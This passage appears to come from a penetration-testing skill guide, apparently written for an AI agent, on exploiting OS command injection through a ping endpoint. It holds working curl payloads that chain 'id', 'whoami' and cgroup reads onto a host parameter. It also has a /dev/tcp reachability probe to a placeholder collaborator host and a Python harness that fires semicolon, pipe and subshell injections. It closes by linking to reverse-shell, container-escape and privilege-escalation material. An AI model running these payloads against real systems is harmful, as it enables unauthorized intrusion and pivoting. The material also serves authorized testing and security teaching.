
```bash
# what did the command actually run as, and where
curl -sS --get --data-urlencode "host=127.0.0.1;id;whoami;pwd;hostname" "$T/ping" -o /tmp/ctx
grep -oE 'uid=[0-9]+|^[a-z_]+$|/' /tmp/ctx | head -8
# container vs host, which is the severity boundary
curl -sS --get --data-urlencode "host=127.0.0.1;cat /proc/1/cgroup;ls /.dockerenv" "$T/ping" | head -5
# and whether the process can reach the network, which determines whether it is a pivot
curl -sS --get --data-urlencode "host=127.0.0.1;timeout 3 sh -c 'echo > /dev/tcp/YOUR_COLLAB/443' && echo REACHABLE" "$T/ping" | tail -2
```

**Record the user, the working directory, and the container boundary.** `uid=0` in a container is a
very different finding from `uid=0` on a host, and the report must say which.

### 19.8 A stopped-on-first-failure harness

```bash
python3 - <<'PY'
import urllib.request, urllib.parse, time, re
T="https://target.tld/ping"
def run(host):
    u=T+"?"+urllib.parse.urlencode({"host":host})
    s=time.time()
    try:
        r=urllib.request.urlopen(u,timeout=20); b=r.read().decode(errors="ignore")
    except Exception as e: return None,"",time.time()-s
    return r.status,b,time.time()-s

results={}
for label,payload in [("control","127.0.0.1"),("semi","127.0.0.1;id"),
                      ("pipe","127.0.0.1|id"),("subst","127.0.0.1$(id)")]:
    c,b,t=run(payload)
    results[label]=(c,"uid=" in b,len(b),round(t,2))
    print(f"{label:8} status={c} uid_evidence={'uid=' in b} size={len(b)} t={t:.2f}")
print()
print("confirmed:", [k for k,(c,e,_,_) in results.items() if e])
print("report ONLY the payloads in that list, each with its raw response")
PY
```

**Stop at the first payload that executes and report that one with its response.** Listing ten
payloads with no captured output is the narration this package exists to prevent.

---

---

## 19. RELATED SIBLINGS - LOAD TOGETHER
- [vuln-research-methodology](../vuln-research-methodology/SKILL.md) — triage, write-up format, and the reproducibility bar for an execution finding
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — how an RCE is framed, scoped, and evidenced for a report
- [injection-checking](../injection-checking/SKILL.md) — the P1 router that decides whether this is a shell sink or another interpreter
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) — the shell that follows a confirmed blind injection
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — the read primitive that turns into this class when an include is reachable
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — conversions and import pipelines that hand user data to a shell sink
- [expression-language-injection](../expression-language-injection/SKILL.md) — the Java EL route to the same `Runtime.exec` sink
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — the alternative RCE route in the same Java stacks
- [jndi-injection](../jndi-injection/SKILL.md) — outbound lookup to code execution, sharing the OOB validation shape
- [container-escape-techniques](../container-escape-techniques/SKILL.md) — what a confirmed in-container execution becomes next
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) · [k8s-postexploit](../k8s-postexploit/SKILL.md) — when the sink is `kubectl exec` or a pod command field
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — converting the recovered process identity into root
- [windows-lolbins-execution-bypass](../windows-lolbins-execution-bypass/SKILL.md) — cmd.exe and PowerShell payload families for the Windows sinks in §12

---
